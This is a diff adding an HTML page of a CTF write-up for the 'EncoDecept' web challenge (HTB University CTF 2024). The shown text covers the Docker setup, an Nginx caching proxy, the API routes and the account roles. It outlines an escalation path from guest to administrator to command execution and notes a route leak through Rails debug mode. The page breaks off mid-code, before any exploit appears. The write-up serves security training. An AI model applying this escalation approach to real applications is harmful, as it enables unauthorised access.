@@ -1,0 +1,1849 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - EncoDecept [EN] | HTB University CTF 2024</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;EncoDecept&#32;[EN]&#32;|&#32;HTB&#32;University&#32;CTF&#32;2024 />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;EncoDecept&#32;[EN]&#32;|&#32;HTB&#32;University&#32;CTF&#32;2024 />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;EncoDecept&#32;[EN]&#32;|&#32;HTB&#32;University&#32;CTF&#32;2024 />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;EncoDecept&#32;[EN]&#32;|&#32;HTB&#32;University&#32;CTF&#32;2024 />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Writeup of the web challenge &#39;encoDecept&#39;" />
+<meta itemprop="description" content="Writeup of the web challenge &#39;encoDecept&#39;" />
+<meta property="og:description" content="Writeup of the web challenge &#39;encoDecept&#39;" />
+<meta name="twitter:description" content="Writeup of the web challenge &#39;encoDecept&#39;" />
+
+
+<base href="//localhost:1313/writeups/encodecept-htb-university-2024/" />
+<link rel="canonical" href="//localhost:1313/writeups/encodecept-htb-university-2024/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/encodecept-htb-university-2024/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/encodecept-htb-university-2024/" />
+<meta property="og:url" content="//localhost:1313/writeups/encodecept-htb-university-2024/" />
+
+
+<meta property="og:updated_time" content="2024-12-15T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/encodecept-htb-university-2024/">EncoDecept [EN] | HTB University CTF 2024</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2024-12-15T12:00:00Z" class="post-date">
+        December 15, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>18 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-web">
+        <a href="//localhost:1313/tags/web">web</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h2 id="introduction">Introduction</h2>
+<p>This challenge is one of the 4 challenges in the WEB category published at the University CTF 2024.
+It is rated medium despite having the lowest resolution in the category. It is therefore considered the hardest web challenge of this edition.</p>
+<h2 id="description">Description</h2>
+<p>The Frontier Board’s iron grip on the galaxy rests on one secret: the location of the legendary Starry Spur, hidden deep within their Intergalactic Contract System (ICMS. With rebellion brewing, Jack Colt is humanity’s last hope. Tasked by the resistance, he must breach the impenetrable system, outwit its defenses, and retrieve the contract that could ignite a revolution. The galaxy’s freedom hangs by a thread—can Jack rise to the challenge?</p>
+<h2 id="files--setup">Files &amp; Setup</h2>
+<p>A docker with all the files is supplied and available here: <a href="">download</a>
+The challenge is easily deployed with the <code>build-docker.sh</code> file.
+Note that we&rsquo;ve added the option <code>-v $(pwd):/home/poc</code> in the second command for the end of the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker build . -t web_encodecept
+</span></span><span style="display:flex;"><span>docker run -it -v <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>:/home/poc -p 1337:1337 -p 8000:8080 web_encodecept
+</span></span></code></pre></div><h2 id="first-analysis--overview">First analysis &amp; overview</h2>
+<p>The docker image is as follows: <code>ruby:3.4-rc-alpine3.20</code>, python3 is also installed and a <em>supervisord</em> is launched.
+This launches three services:</p>
+<ul>
+<li>a Nginx server</li>
+<li>a Django server on port 8000</li>
+<li>a Rails server on port 3000</li>
+</ul>
+<p>Here&rsquo;s the Nginx configuration (cropped):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>..<span style="color:#f92672">[</span>SNIPPED<span style="color:#f92672">]</span>..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    ..<span style="color:#f92672">[</span>SNIPPED<span style="color:#f92672">]</span>..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        listen 1337;
+</span></span><span style="display:flex;"><span>        server_name _;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        location ~ <span style="color:#ae81ff">\.</span><span style="color:#f92672">(</span>css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json<span style="color:#f92672">)</span>$ <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            proxy_cache my_cache;
+</span></span><span style="display:flex;"><span>            proxy_cache_key <span style="color:#e6db74">&#34;</span>$uri$is_args$args<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>            proxy_cache_valid <span style="color:#ae81ff">200</span> 5m;
+</span></span><span style="display:flex;"><span>            proxy_cache_valid <span style="color:#ae81ff">404</span> 1m;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            proxy_pass http://127.0.0.1:3000;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            proxy_set_header Host $http_host; <span style="color:#75715e"># Pass original host and port</span>
+</span></span><span style="display:flex;"><span>            proxy_set_header X-Forwarded-Proto $scheme;
+</span></span><span style="display:flex;"><span>            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            proxy_http_version 1.1;
+</span></span><span style="display:flex;"><span>            add_header X-Cache-Status $upstream_cache_status;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        location / <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            proxy_pass http://127.0.0.1:3000;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            proxy_set_header Host $http_host; <span style="color:#75715e"># Pass original host and port</span>
+</span></span><span style="display:flex;"><span>            proxy_set_header X-Forwarded-Proto $scheme;
+</span></span><span style="display:flex;"><span>            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            proxy_http_version 1.1;
+</span></span><span style="display:flex;"><span>            add_header X-Cache-Status $upstream_cache_status;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>The Nginx server acts as a reverse proxy with a cache system on port <strong>1337</strong>, which is the port exposed in the Dockerfile. We can therefore only make requests to the Ruby server <em>(port 3000)</em> via the Nginx server.</p>
+<p>We can then go to <code>http://localhost:1337/login</code> and access the first login page.
+Once an account has been created, the following page is displayed:
+<img src="./img/image.png" alt="home"></p>
+<p>Here are the various options available to us:</p>
+<ul>
+<li>/contracts</li>
+<li>/settings</li>
+<li>/report</li>
+</ul>
+<p>Before continuing our exploration, let&rsquo;s continue looking at all the files to get a better overview</p>
+<p>The frontend code in Ruby is fairly easy to understand, the two main folders are:</p>
+<ul>
+<li><em>./contract_frontend/app/controllers</em></li>
+<li><em>./contract_frontend/app/views</em>
+<em>(This is where all server logic is implemented. )</em></li>
+</ul>
+<p>On the backend, an API is registered on <code>/api</code> with all these routes:</p>
+<ul>
+<li><strong>register/</strong></li>
+<li><strong>login/</strong></li>
+<li><strong>contract/</strong></li>
+<li><strong>all/</strong></li>
+<li><strong>contracts/filter</strong></li>
+<li><strong>contracts/<a href="int:id">int:id</a>/</strong></li>
+<li><strong>me/</strong></li>
+<li><strong>submit_report/</strong></li>
+<li><strong>contracts/</strong></li>
+<li><strong>contract_templates/</strong></li>
+<li><strong>contract_templates/<a href="int:template_id">int:template_id</a>/</strong></li>
+</ul>
+<p>The <em>./interstellarAPI/contracts/views.py</em> file contains all the logic for these routes, as well as the permissions needed to reach them.</p>
+<p>Three types of account exist on the application:</p>
+<ul>
+<li><code>administrator</code></li>
+<li><code>contract_manager</code></li>
+<li><code>guest</code></li>
+</ul>
+<p>By default, the accounts created are <code>guest</code>.<br>
+In the <em>./interstellarAPI/contracts/management/commands/reset_and_seed.py</em> file, two accounts are created with random and secure passwords:</p>
+<ul>
+<li><code>contract_manager</code></li>
+<li><code>administrator</code>
+In addition, <code>contracts</code> are created in both their names.</li>
+</ul>
+<p>The administrator privilege allows access to additional routes:</p>
+<ul>
+<li>contract_templates/</li>
+<li>contract_templates/<a href="int:template_id">int:template_id</a>/</li>
+</ul>
+<p>The <em>contract_manager</em> can access:</p>
+<ul>
+<li>all/</li>
+<li>contracts/filter</li>
+</ul>
+<p>The path to complete resolution of the challenge is as follows: start with a <em>(guest)</em> user account, raise its privileges to <em>contract_manager</em> and then become <em>administrator</em>. Finally, a command execution is required to read the flag, which is located at the root of the server <em>(ie /flag.txt)</em>.</p>
+<h2 id="analysis-of-the-frontend-and-various-user-routes">Analysis of the frontend and various user routes.</h2>
+<p>Rails debug mode is enabled, so it&rsquo;s easy to list all routes by going to a non-existent path: <code>http://localhost:1337/vozec</code>
+<img src="./img/image-1.png" alt="Leaking routes"></p>
+<p>The Ruby server interfaces with the django api. For each request, it performs a backend action via the locally exposed api.</p>
+<p>For example, the <em>(ruby)</em> connection <em>controller</em> is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SessionsController</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ApplicationController</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://localhost:8080/api/login/&#34;</span>, <span style="color:#e6db74">json</span>: { <span style="color:#e6db74">username</span>: params<span style="color:#f92672">[</span><span style="color:#e6db74">:username</span><span style="color:#f92672">]</span>, <span style="color:#e6db74">password</span>: params<span style="color:#f92672">[</span><span style="color:#e6db74">:password</span><span style="color:#f92672">]</span> })
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status<span style="color:#f92672">.</span>success?
+</span></span><span style="display:flex;"><span>      session<span style="color:#f92672">[</span><span style="color:#e6db74">:token</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>parse<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;token&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>      redirect_to contracts_path, <span style="color:#e6db74">notice</span>: <span style="color:#e6db74">&#39;Logged in successfully&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      flash<span style="color:#f92672">.</span>now<span style="color:#f92672">[</span><span style="color:#e6db74">:alert</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid credentials&#39;</span>
